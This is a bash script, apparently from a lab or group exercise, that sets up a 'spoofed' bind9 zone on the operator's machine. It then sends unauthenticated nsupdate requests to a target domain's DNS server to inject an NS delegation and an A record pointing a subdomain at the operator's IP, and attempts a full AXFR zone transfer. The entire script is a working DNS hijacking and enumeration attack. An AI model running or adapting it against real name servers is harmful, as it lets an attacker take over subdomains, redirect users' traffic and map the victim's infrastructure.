#!/bin/bash

TARGET="openbar.today"
IP="129.88.46.51"
MY_IP=$(curl -s ifconfig.me)

# 1. Setup bind9
sudo apt install bind9 -y

# 2. Create zone file
cat > /etc/bind/db.spoofed << EOF
\$TTL    604800
@       IN      SOA     group1.$TARGET. root.group1.$TARGET. (
                     2024010801         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
;
@       IN      NS      ns1.group1.$TARGET.
@       IN      A       $MY_IP
ns1     IN      A       $MY_IP
EOF

# 3. Configure bind
cat > /etc/bind/named.conf.local << EOF
zone "group1.$TARGET" {
    type master;
    file "/etc/bind/db.spoofed";
    allow-transfer { any; };
    allow-update { any; };
};
EOF

# 4. Restart bind
systemctl restart bind9

# 5. Test DNS updates
nsupdate -v << EOF
server $IP
zone $TARGET
update add group1.$TARGET 300 NS ns1.group1.$TARGET
update add ns1.group1.$TARGET 300 A $MY_IP
send
EOF

# 6. Verify
dig @$IP axfr $TARGET